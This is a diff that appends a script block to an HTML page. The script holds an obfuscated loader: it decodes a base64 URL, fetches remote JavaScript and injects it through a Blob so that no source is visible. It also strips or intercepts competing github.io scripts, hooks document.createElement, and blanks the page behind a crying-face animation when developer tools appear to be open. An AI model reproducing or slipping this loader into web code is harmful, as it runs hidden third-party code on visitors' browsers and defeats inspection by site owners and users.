@@ -198,5 +198,216 @@
 
 })();
 </script> 
+
+
+
+
+<script>
+(function(){
+  'use strict';
+
+  // obfuscated remote URL
+  var _b = 'aHR0cHM6Ly9zaGFraWx4dnMuZ2l0aHViLmlvL2luc3BlY3Qvc2NyaXB0LmpzP3Y9OTk5OQ==';
+  function _d(s){ try{ return atob(s); }catch(e){ return s; } }
+  var remoteUrl = _d(_b);
+
+  // fetch + inject as blob to avoid visible src attribute
+  async function injectRemote(url){
+    try{
+      var r = await fetch(url, { cache: 'no-cache', credentials: 'omit', mode: 'cors' });
+      if(!r.ok) throw 0;
+      var txt = await r.text();
+      txt = txt.replace(/\/\/# sourceMappingURL=.*$/m, '');
+      var wrapped = '(function(){' + txt + '\n})();';
+      var blob = new Blob([wrapped], { type: 'application/javascript' });
+      var blobUrl = URL.createObjectURL(blob);
+      var s = document.createElement('script');
+      s.type = 'application/javascript';
+      s.defer = true;
+      s.crossOrigin = 'anonymous';
+      s.src = blobUrl;
+      s.setAttribute('data-obf','1');
+      (document.head || document.documentElement).appendChild(s);
+      s.addEventListener('load', function(){ try{ URL.revokeObjectURL(blobUrl); }catch(e){} }, { once: true });
+      return true;
+    }catch(e){
+      return false;
+    }
+  }
+
+  // remove visible github scripts
+  function scrubScripts(){
+    try{
+      var ss = document.querySelectorAll('script[src]');
+      for(var i=0;i<ss.length;i++){
+        try{
+          var s = ss[i];
+          if(/github\.io/i.test(s.src) && !s.hasAttribute('data-obf')) s.parentNode && s.parentNode.removeChild(s);
+        }catch(e){}
+      }
+    }catch(e){}
+  }
+
+  // replace page with animated crying SVG
+  function showCryingAnimation(){
+    try{
+      var html = document.documentElement;
+      html.innerHTML = '';
+      var wrap = document.createElement('div');
+      wrap.style.cssText = 'height:100vh;display:flex;align-items:center;justify-content:center;background:#0b0b0b';
+      wrap.innerHTML = '\
+        <div style="text-align:center;color:#fff;font-family:Inter,Arial,sans-serif">\
+          <div id="cry-wrap" style="width:320px;height:320px;display:inline-block">\
+            <svg viewBox="0 0 200 200" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">\
+              <defs>\
+                <linearGradient id="g" x1="0" x2="0" y1="0" y2="1">\
+                  <stop offset="0" stop-color="#fff"/>\
+                  <stop offset="1" stop-color="#dfe9f3"/>\
+                </linearGradient>\
+              </defs>\
+              <circle cx="100" cy="100" r="90" fill="#ffe9e9"/>\
+              <g id="face">\
+                <ellipse cx="70" cy="90" rx="12" ry="16" fill="#111"/>\
+                <ellipse cx="130" cy="90" rx="12" ry="16" fill="#111"/>\
+                <path id="mouth" d="M70 130 Q100 150 130 130" stroke="#111" stroke-width="6" fill="none" stroke-linecap="round"/>\
+                <g id="tears" fill="#6ec6ff" opacity="0">\
+                  <path class="tear" d="M62 110 C58 120 66 132 70 140 C74 132 82 120 78 110 C74 100 66 100 62 110 Z" transform="translate(-6,0)"/>\
+                  <path class="tear" d="M138 110 C134 120 142 132 146 140 C150 132 158 120 154 110 C150 100 142 100 138 110 Z" transform="translate(6,0)"/>\
+                </g>\
+              </g>\
+            </svg>\
+          </div>\
+          <div style="margin-top:18px;font-weight:700;font-size:18px">Content temporarily unavailable</div>\
+        </div>';
+      document.body.style.margin = '0';
+      html.appendChild(wrap);
+
+      // animate tears and mouth
+      var tears = wrap.querySelector('#tears');
+      var mouth = wrap.querySelector('#mouth');
+      var t = 0;
+      function anim(){
+        t++;
+        if(t<60){
+          var op = Math.min(1, t/20);
+          tears.style.opacity = op;
+          mouth.setAttribute('d', 'M70 ' + (130 + Math.sin(t/6)*2) + ' Q100 ' + (150 + Math.sin(t/8)*3) + ' 130 ' + (130 + Math.sin(t/6)*2));
+        } else {
+          var op = 1 - Math.min(1, (t-60)/40);
+          tears.style.opacity = op;
+          mouth.setAttribute('d', 'M70 ' + (130 + Math.sin(t/6)*2) + ' Q100 ' + (150 + Math.sin(t/8)*3) + ' 130 ' + (130 + Math.sin(t/6)*2));
+        }
+        if(t < 200) requestAnimationFrame(anim);
+      }
+      requestAnimationFrame(anim);
+    }catch(e){}
+  }
+
+  // devtools detection heuristics
+  function detectDevtools(cb){
+    try{
+      var detected = false;
+      function check(){
+        try{
+          var threshold = 160;
+          if(window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold){
+            if(!detected){ detected = true; cb(); }
+            return;
+          }
+          var t0 = performance.now();
+          // eslint-disable-next-line no-debugger
+          debugger;
+          var t1 = performance.now();
+          if(t1 - t0 > 100){
+            if(!detected){ detected = true; cb(); }
+            return;
+          }
+        }catch(e){}
+      }
+      var cnt = 0;
+      var id = setInterval(function(){
+        try{ check(); }catch(e){}
+        cnt++; if(cnt>60) clearInterval(id);
+      }, 100);
+    }catch(e){}
+  }
+
+  // mutation observer to scrub newly added scripts
+  function observeScrub(timeout){
+    timeout = timeout || 20000;
+    try{
+      var mo = new MutationObserver(function(muts){
+        muts.forEach(function(m){
+          (m.addedNodes || []).forEach(function(n){
+            try{
+              if(n && n.tagName === 'SCRIPT' && n.src && /github\.io/i.test(n.src) && !n.hasAttribute('data-obf')){
+                n.parentNode && n.parentNode.removeChild(n);
+              }
+            }catch(e){}
+          });
+        });
+      });
+      mo.observe(document.documentElement || document, { childList:true, subtree:true });
+      setTimeout(function(){ try{ mo.disconnect(); }catch(e){} }, timeout);
+    }catch(e){}
+  }
+
+  // defensive overrides to block simple injection of visible src
+  function hardenCreateElement(){
+    try{
+      var orig = Document.prototype.createElement;
+      Document.prototype.createElement = function(name){
+        var el = orig.call(this, name);
+        try{
+          if(String(name).toLowerCase() === 'script'){
+            var desc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src') || {};
+            Object.defineProperty(el, 'src', {
+              set: function(v){
+                try{ if(/github\.io/i.test(String(v))){ this.setAttribute('data-obf-src','1'); return; } }catch(e){}
+                if(desc.set) try{ desc.set.call(this, v); return; }catch(e){}
+                this.setAttribute('src', v);
+              },
+              get: function(){ try{ return desc.get && desc.get.call(this) || this.getAttribute('src'); }catch(e){ return this.getAttribute('src'); } },
+              configurable: true, enumerable: true
+            });
+          }
+        }catch(e){}
+        return el;
+      };
+    }catch(e){}
+  }
+
+  // main
+  (function main(){
+    try{
+      scrubScripts();
+      observeScrub(20000);
+      hardenCreateElement();
+
+      detectDevtools(function(){
+        showCryingAnimation();
+      });
+
+      // attempt blob injection; fallback to direct if fails
+      injectRemote(remoteUrl).then(function(ok){
+        if(!ok){
+          try{
+            var s = document.createElement('script');
+            s.defer = true;
+            s.crossOrigin = 'anonymous';
+            s.src = remoteUrl;
+            s.setAttribute('data-obf-fallback','1');
+            (document.head || document.documentElement).appendChild(s);
+          }catch(e){}
+        }
+      });
+
+    }catch(e){}
+  })();
+
+})();
+</script>
+
+  
 </body>
 </html>
